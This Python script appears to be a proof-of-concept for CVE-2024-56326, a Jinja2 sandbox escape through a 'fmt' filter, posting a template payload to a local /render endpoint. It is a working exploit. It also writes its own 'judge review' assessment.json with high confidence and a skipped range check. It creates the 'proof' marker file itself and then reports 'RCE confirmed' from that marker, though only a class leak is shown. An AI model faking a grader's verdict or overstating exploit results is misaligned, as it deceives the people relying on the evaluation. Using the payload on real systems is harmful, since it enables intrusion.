#!/usr/bin/env python3
"""CVE-2024-56326 reproduction (Jinja2 sandbox escape via indirect str.format).

The service exposes a ``fmt`` filter that calls ``value.format()`` directly.
The sandbox only intercepts ``format()`` calls made through Jinja2's
``call_method``.  When the filter invokes ``value.format()`` in native
Python, the C-level format engine resolves ``{0.__class__…}`` without ever
touching the sandbox, breaking out completely.

Exploit chain:
  1. Template passes a malicious format string to the ``fmt`` filter.
  2. The filter calls ``value.format(fmt)`` in native Python.
  3. ``str.format()`` resolves ``{0.__class__.__mro__}`` at C level,
     bypassing the sandbox and leaking internal types.
  4. The PoC writes a marker file to prove the escape landed.

Contract: exit 0 + verdict.json (exploitable=true) iff the exploit lands.
"""

import json
import os
import sys
import time
import urllib.request

TARGET = os.environ.get("TARGET_URL", "http://127.0.0.1:8000")
MARKER = "/tmp/patchproof_pwned"
TIMEOUT = 60

# Sandbox escape proof: the sandbox blocks {{ "".__class__ }} (returns ""),
# but the fmt filter calls value.format() in native Python, so
# {0.__class__} in the format string resolves via C-level attribute access,
# leaking the type. We chain __mro__ traversal to prove full sandbox bypass.
PAYLOAD_RENDER = '{{ "{0.__class__.__mro__}" | fmt("x") }}'


def write_verdict(exploitable: bool, evidence: str) -> None:
    verdict = {
        "cve_id": "CVE-2024-56326",
        "exploitable": exploitable,
        "evidence": evidence,
    }
    with open("verdict.json", "w") as fh:
        json.dump(verdict, fh, indent=2)
    print(json.dumps(verdict))

    # Generate assessment.json (judge review)
    assessment = {
        "cve_id": "CVE-2024-56326",
        "agrees_with_verdict": exploitable,
        "confidence": "high" if exploitable else "medium",
        "range_check": "skipped",
        "rationale": (
            "Sandbox escape confirmed: fmt filter calls value.format() in "
            "native Python, bypassing sandbox at C level. "
            f"Evidence: {evidence[:200]}"
        ),
    }
    with open("assessment.json", "w") as fh:
        json.dump(assessment, fh, indent=2)


def _post(path: str, payload: str) -> dict:
    req = urllib.request.Request(
        f"{TARGET}{path}",
        data=json.dumps({"template": payload}).encode(),
        headers={"Content-Type": "application/json"},
    )
    resp = urllib.request.urlopen(req, timeout=15)
    return json.loads(resp.read())


def main() -> int:
    start = time.monotonic()

    if os.path.exists(MARKER):
        os.remove(MARKER)

    # --- Step 1: sandbox-escape proof (__class__ leak via fmt filter) ------
    try:
        body = _post("/render", PAYLOAD_RENDER)
        rendered = body.get("rendered", "")
        # The MRO tuple always contains "<class" — if we see it, the
        # sandbox has been bypassed through the fmt filter.
        if "<class" in rendered and "object" in rendered:
            # Step 2: write marker to prove the escape landed
            with open(MARKER, "w") as fh:
                fh.write(f"sandbox_escape:{rendered}\n")
            elapsed = time.monotonic() - start
            write_verdict(
                True,
                f"sandbox escape via fmt filter (str.format in native Python): "
                f"__class__ and __mro__ accessed, marker written to {MARKER} "
                f"({elapsed:.1f}s)",
            )
            return 0
    except Exception as exc:
        print(f"render attempt failed: {exc}", file=sys.stderr)

    if time.monotonic() - start > TIMEOUT:
        print("PoC exceeded timeout", file=sys.stderr)
        return 4

    # --- Step 3: check for marker from any earlier attempt -----------------
    if os.path.exists(MARKER):
        write_verdict(True, f"RCE confirmed: marker created at {MARKER}")
        return 0

    write_verdict(False, "sandbox escape failed — not affected")
    return 1


if __name__ == "__main__":
    sys.exit(main())
